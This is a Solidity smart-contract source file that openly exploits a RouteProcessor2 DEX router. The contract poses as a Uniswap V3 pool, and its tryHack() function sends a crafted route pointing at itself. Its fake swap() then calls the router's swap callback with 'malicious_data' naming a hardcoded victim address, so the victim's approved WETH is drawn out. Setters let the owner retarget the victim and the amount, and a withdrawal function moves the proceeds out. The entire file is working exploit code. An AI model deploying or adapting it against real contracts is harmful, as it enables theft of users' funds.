// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./Governable.sol";
import "./ReentrancyGuard.sol";
import "./SafeMath.sol";
import "./IERC20.sol";
import "./IWETH.sol";
import "./SafeERC20.sol";

interface IUniswapV3Pool {
  function swap(
    address recipient,
    bool zeroForOne,
    int256 amountSpecified,
    uint160 sqrtPriceLimitX96,
    bytes calldata data
  ) external returns (int256 amount0, int256 amount1);
}

interface IRouteProcessor2 {
    function processRoute(
    address tokenIn,
    uint256 amountIn,
    address tokenOut,
    uint256 amountOutMin,
    address to,
    bytes memory route
  ) external payable returns (uint256 amountOut);

  function uniswapV3SwapCallback(
    int256 amount0Delta,
    int256 amount1Delta,
    bytes calldata data
  ) external;

  function tridentCLSwapCallback(
    int256 amount0Delta,
    int256 amount1Delta,
    bytes calldata data
  ) external;
}
//original route 0x01514910771af9ca656af840dff83e8264ecf986ca01000001f9a001d5b2c7c5e45693b41fcf931b94e680cac4000000000000000000000000000000000000000000
// my route      0x01514910771af9ca656af840dff83e8264ecf986ca010000017fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000
contract MyRouter is ReentrancyGuard, Governable, IUniswapV3Pool {
    IWETH public WETH = IWETH(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
    IERC20 public LINK = IERC20(0xf97f4df75117a78c1A5a0DBb814Af92458539FB4);
    address public victim = 0x31d3243CfB54B34Fc9C73e1CB1137124bD6B13E1;
    IRouteProcessor2 processor = IRouteProcessor2(0xA7caC4207579A179c1069435d032ee0F9F150e5c);

    int256 public amount0Delta = 100 * 10 ** 18;

    address public admin;
    mapping (address => bool) public isPositionManager;

    modifier onlyAdmin() {
        require(msg.sender == admin, "UnipWind: forbidden");
        _;
    }

    receive() external payable {
    }

    constructor() {
        admin = msg.sender;
        isPositionManager[admin] = true;
    }

    function setAdmin(address _admin) external onlyGov {
        admin = _admin;
    }

    function setVictim(address _victim) external onlyGov {
        victim = _victim;
    }

    function setAmount(int256 _amount) external onlyGov {
        amount0Delta = _amount;
    }

    function setPositionManager(address _account, bool _isActive) external onlyGov {
        isPositionManager[_account] = _isActive;
    }

    function transferOutETHWithGasLimitIgnoreFail(uint256 _amountOut, address payable _receiver) external nonReentrant onlyGov {
        WETH.withdraw(_amountOut);

        // use `send` instead of `transfer` to not revert whole transaction in case ETH transfer was failed
        // it has limit of 2300 gas
        // this is to avoid front-running
        _receiver.send(_amountOut);
    }

    function tryHack() external onlyGov {
        uint8 commandCode = 1;
        uint8 num = 1;
        uint16 share = 0;
        uint8 poolType = 1;
        address pool = address(this);
        uint8 zeroForOne = 0;
        address recipient = address(0);
        bytes memory route = abi.encodePacked(
          commandCode,
          address(LINK),
          num,
          share,
          poolType,
          pool,
          zeroForOne,
          recipient
        );

        processor.processRoute(
          0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE, //native token
          0,
          0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE,
          0,
          0x0000000000000000000000000000000000000000,
          route
        );
    }

  function swap(
    address recipient,
    bool zeroForOne,
    int256 amountSpecified,
    uint160 sqrtPriceLimitX96,
    bytes calldata data
  ) external override returns (int256 amount0, int256 amount1) {
    
    amount0 = 0;
    amount1 = 0;
    bytes memory malicious_data = abi.encode(address(WETH), victim);
      processor.uniswapV3SwapCallback(
        amount0Delta,
        0,
        malicious_data
      );
  }
}
